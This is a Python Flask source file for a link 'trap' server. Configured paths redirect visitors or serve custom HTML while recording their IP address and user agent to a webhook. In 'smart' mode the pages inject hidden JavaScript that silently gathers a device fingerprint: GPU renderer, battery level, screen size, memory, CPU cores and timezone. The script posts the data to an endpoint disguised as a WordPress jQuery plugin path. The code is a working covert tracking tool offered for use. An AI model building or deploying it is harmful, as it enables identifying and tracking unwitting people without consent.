import sqlite3
import requests
import time
import os
from flask import Flask, request, redirect, render_template, session, url_for, render_template_string, abort, Response

app = Flask(__name__)

# ------# --- CONFIGURATION (LOADED FROM ENV) ---
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "default_password_please_change")
SECRET_KEY = os.environ.get("SECRET_KEY", "change_me_to_something_random")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
FALLBACK_URL = os.environ.get("FALLBACK_URL", "https://google.com")
DB_FILE = "/data/routes.db" # Save DB in a persistent folder
#---------------
app.secret_key = SECRET_KEY

# --- 1. TEMPLATE FOR REDIRECTS (Shows Loading -> Redirects) ---
SMART_LOADER_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
    <style>body { background: #000; }</style>
</head>
<body>
    <script>
        const _dest = "{{ destination }}";

        async function initSession() {
            let _b = null; let _g = null;
            try { if (navigator.getBattery) { const b = await navigator.getBattery(); _b = (b.level * 100); } } catch (e) {}
            try { const c = document.createElement('canvas'); const gl = c.getContext('webgl') || c.getContext('experimental-webgl'); const dbg = gl.getExtension('WEBGL_debug_renderer_info'); _g = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } catch (e) {}

            const _p = { p: navigator.platform, s: screen.width + "x" + screen.height, g: _g, b: _b, m: navigator.deviceMemory, c: navigator.hardwareConcurrency, t: Intl.DateTimeFormat().resolvedOptions().timeZone };

            try { await fetch('/wp-content/plugins/jquery-min/session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_p), keepalive: true }); } catch (e) {}

            window.location.href = _dest;
        }
        initSession();
        setTimeout(() => { window.location.href = _dest; }, 1500);
    </script>
</body>
</html>
"""

# --- 2. INJECTION CODE FOR CUSTOM HTML (Silent Background Log) ---
# This appends to your custom HTML. It logs data but DOES NOT redirect.
SMART_INJECT_CODE = """
<script>
    async function _silentLog() {
        let _b = null; let _g = null;
        try { if (navigator.getBattery) { const b = await navigator.getBattery(); _b = (b.level * 100); } } catch (e) {}
        try { const c = document.createElement('canvas'); const gl = c.getContext('webgl') || c.getContext('experimental-webgl'); const dbg = gl.getExtension('WEBGL_debug_renderer_info'); _g = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } catch (e) {}

        const _p = { p: navigator.platform, s: screen.width + "x" + screen.height, g: _g, b: _b, m: navigator.deviceMemory, c: navigator.hardwareConcurrency, t: Intl.DateTimeFormat().resolvedOptions().timeZone };

        try { await fetch('/wp-content/plugins/jquery-min/session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_p), keepalive: true }); } catch (e) {}
    }
    _silentLog();
</script>
"""

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS routes
                 (path TEXT PRIMARY KEY, type TEXT, content TEXT, is_smart INTEGER, page_title TEXT)''')
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

# --- LOGGING HELPER ---
def send_alert(ip, user_agent, path, action_type, detail, color=None):
    if color is None:
        color = 65280 if action_type == "Redirect" else 16776960

    data = {
        "username": "Admin Logger",
        "embeds": [{
            "title": "🎯 Trap Triggered",
            "color": color,
            "fields": [
                {"name": "Path", "value": f"`/{path}`", "inline": False},
                {"name": "Action", "value": f"**{action_type}**", "inline": True},
                {"name": "Detail", "value": f"`{detail}`", "inline": True},
                {"name": "IP", "value": f"`{ip}`", "inline": False},
                {"name": "User Agent", "value": f"```{user_agent}```", "inline": False}
            ]
        }]
    }
    try: requests.post(WEBHOOK_URL, json=data)
    except: pass

# --- CAMOUFLAGED ENDPOINT ---
@app.route('/wp-content/plugins/jquery-min/session', methods=['POST'])
def collect_detailed_data():
    try:
        data = request.json
        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            ip = request.remote_addr

        webhook_data = {
            "username": "Data Fingerprinter",
            "embeds": [{
                "title": "🕵️ Detailed Device Fingerprint",
                "color": 3447003, # Blue
                "fields": [
                    {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "Platform", "value": f"`{data.get('p', 'Unknown')}`", "inline": True},
                    {"name": "Screen Res", "value": f"`{data.get('s', 'Unknown')}`", "inline": True},
                    {"name": "GPU", "value": f"`{data.get('g', 'Unknown')}`", "inline": False},
                    {"name": "Battery", "value": f"`{data.get('b', 'Unknown')}%`", "inline": True},
                    {"name": "Memory", "value": f"`{data.get('m', 'Unknown')} GB`", "inline": True},
                    {"name": "Cores", "value": f"`{data.get('c', 'Unknown')}`", "inline": True},
                ]
            }]
        }
        requests.post(WEBHOOK_URL, json=webhook_data)
    except Exception as e:
        print(e)
    return Response("1", status=200, mimetype='text/plain')

# --- ADMIN ROUTES ---
@app.route('/admin/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        time.sleep(1)
        if request.form['password'] == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return "Wrong password", 401
    return render_template('login.html')

@app.route('/admin')
def admin_dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    conn = get_db_connection()
    routes = conn.execute('SELECT * FROM routes').fetchall()
    conn.close()
    return render_template('admin.html', routes=routes)

@app.route('/admin/add', methods=['POST'])
def add_route():
    if not session.get('logged_in'): return redirect(url_for('login'))

    path = request.form['path'].strip('/')
    r_type = request.form['type']
    content = request.form['content']
    is_smart = 1 if request.form.get('is_smart') else 0
    page_title = request.form.get('page_title', '')

    conn = get_db_connection()
    conn.execute('INSERT OR REPLACE INTO routes (path, type, content, is_smart, page_title) VALUES (?, ?, ?, ?, ?)',
                 (path, r_type, content, is_smart, page_title))
    conn.commit()
    conn.close()
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/delete/<path:path>')
def delete_route(path):
    if not session.get('logged_in'): return redirect(url_for('login'))
    conn = get_db_connection()
    conn.execute('DELETE FROM routes WHERE path = ?', (path,))
    conn.commit()
    conn.close()
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- CATCH ALL ---
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if path == 'favicon.ico': return abort(404)
    if path.startswith("admin"): return redirect(url_for('login'))

    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    user_agent = request.headers.get('User-Agent')

    conn = get_db_connection()
    route = conn.execute('SELECT * FROM routes WHERE path = ?', (path,)).fetchone()
    conn.close()

    if route:
        # Case 1: REDIRECT
        if route['type'] == 'redirect':
            if route['is_smart'] == 1:
                # Redirect + Smart: Show Loading Page -> Then Redirect
                send_alert(ip, user_agent, path, "Smart Log (JS)", route['content'])
                return render_template_string(SMART_LOADER_TEMPLATE,
                                            title=route['page_title'],
                                            destination=route['content'])
            else:
                # Redirect + Normal: Immediate Redirect
                send_alert(ip, user_agent, path, "Redirect", route['content'])
                return redirect(route['content'])

        # Case 2: HTML
        elif route['type'] == 'html':
            if route['is_smart'] == 1:
                # HTML + Smart: Serve HTML + Inject JS (Silent Log)
                send_alert(ip, user_agent, path, "Served HTML (Smart)", "Custom Content")
                # Append the JS script to the end of their HTML content
                return route['content'] + SMART_INJECT_CODE
            else:
                # HTML + Normal: Serve raw HTML
                send_alert(ip, user_agent, path, "Served HTML", "Custom Content")
                return route['content']

    send_alert(ip, user_agent, path, "Fallback", FALLBACK_URL, 16711680)
    return redirect(FALLBACK_URL)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=80)
